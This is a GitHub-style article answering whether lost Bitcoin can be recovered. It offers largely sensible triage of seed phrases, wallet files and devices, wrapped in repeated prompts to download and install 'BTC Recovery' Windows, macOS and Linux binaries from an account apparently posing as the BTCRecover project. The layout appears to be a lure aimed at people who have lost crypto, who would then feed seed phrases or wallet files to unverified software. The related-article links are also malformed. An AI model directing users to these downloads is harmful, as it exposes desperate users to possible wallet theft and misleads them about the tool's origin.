<div align="center">
<img src="assets/banner-article.png" alt="Can lost Bitcoin be recovered?">
</div>

# Can lost Bitcoin be recovered?

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

Sometimes, and the dividing line is precise: Bitcoin is recoverable when some input that produces the keys still exists  -  a phrase, a wallet file, a password you partly remember. It is not recoverable when nothing that generates or unlocks those keys survives, and no service, authority or tool changes that.

## You'll see this if

You are trying to work out whether your case is worth an evening, a week, or nothing at all. The question is not how much was lost but what survived, and that is answerable in a few minutes.

| What survived | Recoverable? | Route |
|---|---|---|
| Most of a seed phrase, plus a known address | yes, by search | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |
| A complete phrase, wrong wallet type | yes, by derivation | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |
| An encrypted wallet file, password partly remembered | yes, by candidate search | [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md) |
| A hardware device with its PIN | yes, by the device | the device's own recovery flow |
| Only an address, or only a balance figure | no | nothing to derive from |
| A phrase never written down and a device that is gone | no | nothing to search against |
| A custodial account you cannot log into | not this kind of recovery | the provider's account process |
| Coins sent to an address you do not control | no | a confirmed transaction is final |

## Why it happens

Bitcoin has no accounts and no administrator. Ownership is control of a key, the key is derived from something you hold, and if that something is gone there is no record anywhere to appeal to. This is not a policy that could be relaxed: the network has no mechanism for moving coins without a signature.

That is why recovery is always local and always arithmetic. A search over one missing word is small; a search over an unknown random password is not a search at all. The tool does not break encryption  -  it reproduces inputs and tests them, which is why a partial memory is genuinely useful and a total absence is not.

The distinction people miss is between *lost access* and *lost coins*. A wallet file with an unknown password still contains the keys; the coins are sitting there, unspendable by you. A phrase that was destroyed and a device that was wiped leave nothing behind. One is a locked door with the key somewhere in your memory; the other is a demolished house.

Time changes the odds in one direction only. A wallet file untouched for a decade is no harder to search than one from last year, because the encryption does not weaken with age  -  but the records that identify its address, its wallet type or its password do decay. On a cold case the useful work is archival rather than computational.

## Fix

**Install the current release first.** Download and run [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1) from the releases page; the steps below assume that build.

Establish what survived, in this order, and stop at the first thing you have.

1. **Check for a phrase, in any state.** Full, partial, misordered, on paper, in a photograph of a page, in an old notebook. This is the highest-value artifact by a wide margin: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
2. **Check for a file.** A `wallet.dat`, an Electrum file, a browser vault, a backup folder, an old laptop's disk image. A file with an unknown password is recoverable by search: [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md).
3. **Check for a device.** A hardware wallet with a working PIN, or a phone with the app still installed. Working access is not a recovery problem at all.
4. **Check for a key.** An exported private key, a paper wallet, a WIF string in an old note. A key does not need a phrase: [A private key is not a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/private-key-vs-seed-phrase-btcrecover.md).
5. **Check what the wallet was**, if none of the above exists but the software might. Old wallets sometimes leave traces  -  a data directory, an installer, a settings file: [Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md).
6. **Write down which of the six you have**, because the next step depends on it and memory is unreliable under stress.

## If that did not work

If none of the six exists, the coins are unreachable and the remaining work is to be sure of that rather than to search harder.

Be sure in the right order. Confirm the wallet was self-custody  -  a custodial balance belongs to the provider and is recovered through them, not through keys. Confirm the phrase was not written anywhere: check photographs, cloud notes, email drafts, old chat messages, the back of a book, a safe. Confirm no file survives on any disk, including the family computer and an old phone in a drawer. People find backups in the last place they look because they stopped looking.

Then accept the boundary. No legitimate service recovers coins whose keys are gone, and every offer to do so is either a theft attempt or a fee for nothing: [You shared your seed phrase: what is recoverable](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-shared-seed-phrase.md) covers what a compromised or vanished phrase means for the coins. Where the loss is partial  -  a phrase with words missing  -  the case is not closed at all, and [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md) is the checklist for making a search succeed.

## Prevention

- Treat the phrase as the wallet: two copies, two places, one of them fire-resistant.
- Record the wallet type, year and first address beside every backup.
- Encrypt wallet files and store the password in a manager with an offline recovery code.
- Test one restore a year, before you need it.
- Never share a phrase, a key or a file with anyone offering recovery help.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Can lost Bitcoin ever be recovered?

Yes, when something that produces the keys survives: a phrase, a file, a device, a key. Not when all of it is gone  -  the network has no mechanism to restore access without a signature, and no third party can create one.

### Can I recover my Bitcoin wallet without the recovery phrase?

If a wallet file survives with a recoverable password, yes. If a private key survives, yes. If neither exists and the phrase is gone, no: a phrase is not stored in the wallet, so there is nothing to look up.

### Can cryptocurrency be recovered?

The same rule applies to every chain: recovery means reproducing an input, not reversing a transaction. What differs between coins is only which artifacts the software supports, so a wallet the tool does not target has no local route regardless of the balance.

### What happens if you lose your 12-word recovery phrase?

The wallet keeps working on any device that still has it, and stops being restorable anywhere else. Losing the phrase is only fatal when the last working copy of the wallet is also gone  -  which is why a tested second copy matters more than any recovery step.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [wallet.dat password recovery for Bitcoin Core]([wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md))
- [You shared your seed phrase]([You shared your seed phrase: what is recoverable](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-shared-seed-phrase.md))
- [Old wallets and Bitcoin from years ago]([Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md))
